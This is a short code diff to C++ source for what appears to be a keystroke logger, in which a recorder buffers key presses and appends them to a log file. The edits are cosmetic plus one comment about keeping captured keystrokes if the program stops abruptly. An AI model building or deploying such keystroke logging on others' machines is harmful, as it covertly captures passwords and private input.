@@ -3,7 +3,6 @@
 #include <cerrno>
 #include <cstring>
 #include <fstream>
-#include <memory>
 #include <stdexcept>
 #include <string>
 
@@ -17,7 +16,7 @@ Recorder::Recorder(int key_limit) : num_keys_(0), keys_(key_limit) {
 
 void Recorder::BufferKeyPress(char character) {
   if (num_keys_ >= static_cast<int>(keys_.capacity())) {
-    /* no room remaining to log this key, flush the buffer */
+    /* No room remaining to log this key, flush the buffer. */
     Transmit();
   }
   keys_[num_keys_++] = character;
@@ -31,6 +30,9 @@ void FileRecorder::Transmit() {
     return;
   }
 
+  /* We open and close the log file everytime Transmit() is called because we
+   * want to ensure in the case the program is stopped abruptly, we will have a
+   * chance at saving some keystroke data. */
   std::ofstream log_handle(log_path_.c_str(), std::ios_base::app);
   if (!log_handle) {
     throw std::runtime_error("unable to open key log file");
